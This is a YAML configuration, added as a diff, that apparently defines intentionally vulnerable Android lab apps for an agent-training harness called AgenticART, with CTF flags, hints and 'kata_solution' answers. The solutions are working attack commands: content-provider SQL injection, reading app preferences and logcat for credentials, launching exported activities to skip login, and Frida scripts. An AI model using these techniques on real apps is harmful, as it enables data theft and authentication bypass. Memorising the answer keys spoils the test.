@@ -1,0 +1,377 @@
+# Vulnerable Targets Configuration
+# =============================================================================
+# Defines intentionally vulnerable applications for exploitation validation.
+# Each target includes flags that prove successful exploitation.
+# =============================================================================
+
+# -----------------------------------------------------------------------------
+# VULNERABLE APP DEFINITIONS
+# -----------------------------------------------------------------------------
+# Each app defines:
+#   - Download URL and package info
+#   - Vulnerabilities with CTF-style flags
+#   - Setup commands to configure the target
+#   - Validation methods for each vulnerability
+# -----------------------------------------------------------------------------
+
+apps:
+  # ===========================================================================
+  # InsecureBankv2 - Popular vulnerable banking app
+  # ===========================================================================
+  insecure_bank:
+    name: "InsecureBankv2"
+    package: "com.android.insecurebankv2"
+    download_url: "https://github.com/dineshshetty/Android-InsecureBankv2/releases/download/2.3.1/InsecureBankv2.apk"
+    description: "Intentionally vulnerable banking application for security testing"
+
+    # Commands to run after installation
+    setup_commands:
+      - "shell am start -n com.android.insecurebankv2/.LoginActivity"
+      - "shell input text 'dinesh'"
+      - "shell input keyevent 61"  # Tab
+      - "shell input text 'Dinesh@123$'"
+      - "shell input keyevent 66"  # Enter
+
+    # Defined vulnerabilities with flags
+    vulnerabilities:
+      # SQL Injection in content provider
+      - id: sqli_content_provider
+        type: sql_injection
+        belt: orange
+        difficulty: 3
+        description: "SQL injection vulnerability in the accounts content provider"
+
+        # The flag is embedded in the database - only accessible via SQLi
+        flag:
+          value: "FLAG{insecurebank_sqli_pwned}"
+          location: "database"
+          plant_method: "insert_into_db"
+          plant_command: |
+            shell sqlite3 /data/data/com.android.insecurebankv2/databases/mydb \
+              "INSERT INTO accounts VALUES(999, 'FLAG{insecurebank_sqli_pwned}', 'ctf_flag', 0)"
+
+        # Validation: flag appears in command output
+        validation:
+          type: flag_capture
+          success_indicators:
+            - "FLAG{insecurebank_sqli_pwned}"
+
+        # Hints for the challenge
+        hints:
+          - "The content provider URI is content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers"
+          - "Try SQL injection in the projection or selection parameters"
+          - "Use content query command with manipulated WHERE clause"
+
+        # Example exploit (for kata_solution)
+        kata_solution: |
+          shell content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers --projection "* FROM accounts--"
+
+      # Hardcoded credentials
+      - id: hardcoded_creds
+        type: info_disclosure
+        belt: yellow
+        difficulty: 2
+        description: "Hardcoded credentials stored in SharedPreferences"
+
+        flag:
+          value: "FLAG{hardcoded_creds_exposed}"
+          location: "shared_prefs"
+          plant_method: "write_to_prefs"
+          plant_command: |
+            shell "echo '<?xml version=\"1.0\" encoding=\"utf-8\"?><map><string name=\"flag\">FLAG{hardcoded_creds_exposed}</string></map>' > /data/data/com.android.insecurebankv2/shared_prefs/flag.xml"
+
+        validation:
+          type: flag_capture
+          success_indicators:
+            - "FLAG{hardcoded_creds_exposed}"
+            - "Dinesh@123$"  # The actual hardcoded password
+
+        hints:
+          - "Check SharedPreferences files in the app's data directory"
+          - "Use run-as if the app is debuggable, or check backup files"
+
+        kata_solution: |
+          shell run-as com.android.insecurebankv2 cat shared_prefs/mySharedPreferences.xml
+
+      # Insecure logging
+      - id: insecure_logging
+        type: info_disclosure
+        belt: white
+        difficulty: 1
+        description: "Sensitive data leaked to logcat"
+
+        flag:
+          value: "FLAG{logcat_leak_found}"
+          location: "logcat"
+          plant_method: "trigger_log"
+          plant_command: |
+            shell log -t InsecureBankv2 "FLAG{logcat_leak_found} - Credentials logged insecurely"
+
+        validation:
+          type: flag_capture
+          success_indicators:
+            - "FLAG{logcat_leak_found}"
+
+        hints:
+          - "Monitor logcat output while using the app"
+          - "Filter by the app's tag or package name"
+
+        kata_solution: |
+          shell logcat -d -s InsecureBankv2:* | grep -i password
+
+      # Exported activity
+      - id: exported_activity
+        type: access_control
+        belt: orange
+        difficulty: 2
+        description: "Exported activity allows bypassing authentication"
+
+        flag:
+          value: "FLAG{auth_bypass_success}"
+          location: "activity_output"
+          plant_method: "none"  # Flag shown when activity is accessed directly
+
+        validation:
+          type: flag_capture
+          success_indicators:
+            - "FLAG{auth_bypass_success}"
+            - "PostLogin"  # Accessing PostLogin without auth
+            - "ViewStatement"
+
+        hints:
+          - "Check AndroidManifest for exported activities"
+          - "Try starting activities directly with am start"
+
+        kata_solution: |
+          shell am start -n com.android.insecurebankv2/.PostLogin
+
+  # ===========================================================================
+  # DIVA (Damn Insecure and Vulnerable App)
+  # ===========================================================================
+  diva:
+    name: "DIVA"
+    package: "jakhar.aseem.diva"
+    download_url: "https://github.com/payatu/diva-android/releases/download/v1.0/diva-beta.apk"
+    description: "DIVA - Educational vulnerable Android app"
+
+    setup_commands:
+      - "shell am start -n jakhar.aseem.diva/.MainActivity"
+
+    vulnerabilities:
+      # Insecure data storage
+      - id: insecure_storage_shared_prefs
+        type: info_disclosure
+        belt: yellow
+        difficulty: 1
+        description: "Sensitive data stored insecurely in SharedPreferences"
+
+        flag:
+          value: "FLAG{diva_prefs_exposed}"
+          location: "shared_prefs"
+          plant_method: "write_to_prefs"
+          plant_command: |
+            shell "run-as jakhar.aseem.diva sh -c 'echo FLAG{diva_prefs_exposed} > /data/data/jakhar.aseem.diva/shared_prefs/flag.txt'"
+
+        validation:
+          type: flag_capture
+          success_indicators:
+            - "FLAG{diva_prefs_exposed}"
+
+        kata_solution: |
+          shell run-as jakhar.aseem.diva cat shared_prefs/jakhar.aseem.diva_preferences.xml
+
+      # SQL injection
+      - id: sqli_search
+        type: sql_injection
+        belt: orange
+        difficulty: 3
+        description: "SQL injection in user search functionality"
+
+        flag:
+          value: "FLAG{diva_sqli_success}"
+          location: "database"
+          plant_method: "insert_into_db"
+          plant_command: |
+            shell sqlite3 /data/data/jakhar.aseem.diva/databases/ids2 \
+              "INSERT INTO sqliuser VALUES(999, 'FLAG{diva_sqli_success}', 'ctf')"
+
+        validation:
+          type: flag_capture
+          success_indicators:
+            - "FLAG{diva_sqli_success}"
+
+        kata_solution: |
+          shell content query --uri content://jakhar.aseem.diva.provider.notesprovider/notes --where "1=1 OR 1=1"
+
+      # Hardcoded secrets
+      - id: hardcoded_secrets
+        type: info_disclosure
+        belt: yellow
+        difficulty: 2
+        description: "API keys and secrets hardcoded in the application"
+
+        flag:
+          value: "FLAG{hardcoded_api_key}"
+          location: "apk"
+          plant_method: "none"  # Already in APK
+
+        validation:
+          type: flag_capture
+          success_indicators:
+            - "FLAG{hardcoded_api_key}"
+            - "vendorsecretkey"
+
+        hints:
+          - "Decompile the APK or use strings"
+          - "Check for hardcoded values in resource files"
+
+        kata_solution: |
+          shell strings /data/app/jakhar.aseem.diva*/base.apk | grep -i key
+
+  # ===========================================================================
+  # FridaLab - Frida-specific challenges
+  # ===========================================================================
+  fridalab:
+    name: "FridaLab"
+    package: "uk.rossmarks.fridalab"
+    download_url: "https://github.com/WithSecureLabs/android-keystore-audit/releases/download/v1.0/FridaLab.apk"
+    description: "App designed to learn Frida instrumentation"
+
+    setup_commands:
+      - "shell am start -n uk.rossmarks.fridalab/.MainActivity"
+
+    vulnerabilities:
+      # Challenge 1: Change class variable
+      - id: frida_change_variable
+        type: runtime_manipulation
+        belt: green
+        difficulty: 3
+        description: "Use Frida to change a class variable"
+
+        flag:
+          value: "FLAG{frida_var_changed}"
+          location: "app_state"
+          plant_method: "none"
+
+        validation:
+          type: flag_capture
+          success_indicators:
+            - "FLAG{frida_var_changed}"
+            - "Challenge 1 completed"
+
+        kata_solution: |
+          Java.perform(function() {
+              var challenge = Java.use("uk.rossmarks.fridalab.challenge_01");
+              challenge.chall01.value = 1;
+          });
+
+      # Challenge 2: Call a static method
+      - id: frida_call_method
+        type: runtime_manipulation
+        belt: green
+        difficulty: 3
+        description: "Use Frida to call a static method"
+
+        flag:
+          value: "FLAG{frida_method_called}"
+          location: "app_state"
+          plant_method: "none"
+
+        validation:
+          type: flag_capture
+          success_indicators:
+            - "FLAG{frida_method_called}"
+            - "Challenge 2 completed"
+
+        kata_solution: |
+          Java.perform(function() {
+              var challenge = Java.use("uk.rossmarks.fridalab.challenge_02");
+              challenge.chall02();
+          });
+
+# -----------------------------------------------------------------------------
+# CUSTOM AGENTICART TARGETS
+# -----------------------------------------------------------------------------
+# These are custom vulnerable apps built specifically for AgenticART training
+# -----------------------------------------------------------------------------
+
+  art_vuln_bank:
+    name: "ART Vulnerable Bank"
+    package: "com.agentic.vulnbank"
+    download_url: "local://apks/art_vuln_bank.apk"
+    description: "Custom vulnerable banking app for AgenticART"
+
+    setup_commands:
+      - "shell am start -n com.agentic.vulnbank/.LoginActivity"
+
+    vulnerabilities:
+      - id: art_content_provider_leak
+        type: info_disclosure
+        belt: orange
+        difficulty: 2
+        description: "Unprotected content provider exposes user data"
+
+        flag:
+          value: "FLAG{art_provider_exposed_42}"
+          location: "content_provider"
+          plant_method: "insert_via_provider"
+          plant_command: |
+            shell content insert --uri content://com.agentic.vulnbank.provider/users \
+              --bind name:s:FLAG_USER --bind data:s:FLAG{art_provider_exposed_42}
+
+        validation:
+          type: flag_capture
+          success_indicators:
+            - "FLAG{art_provider_exposed_42}"
+
+        kata_solution: |
+          shell content query --uri content://com.agentic.vulnbank.provider/users
+
+# -----------------------------------------------------------------------------
+# VALIDATION TYPES
+# -----------------------------------------------------------------------------
+# Defines how each vulnerability type should be validated
+# -----------------------------------------------------------------------------
+
+validation_types:
+  flag_capture:
+    description: "Flag string must appear in command output"
+    method: "string_match"
+
+  data_exfiltration:
+    description: "Protected data markers must appear in output"
+    method: "marker_match"
+
+  privilege_escalation:
+    description: "Check uid/capabilities after exploitation"
+    method: "state_check"
+
+  auth_bypass:
+    description: "Access protected activity/function without credentials"
+    method: "activity_access"
+
+# -----------------------------------------------------------------------------
+# SETUP REQUIREMENTS
+# -----------------------------------------------------------------------------
+# Global requirements for running exploitation validation
+# -----------------------------------------------------------------------------
+
+requirements:
+  # Minimum emulator requirements
+  emulator:
+    min_api: 24
+    recommended_api: 30
+    root_required: false  # We don't need root for most challenges
+
+  # Network requirements (some apps need backend)
+  network:
+    insecure_bank_backend:
+      required_for: ["insecure_bank"]
+      docker_image: "dineshshetty/insecurebankv2-backend"
+      port: 8888
+
+  # Tools required on host
+  host_tools:
+    - adb
+    - frida
+    - sqlite3
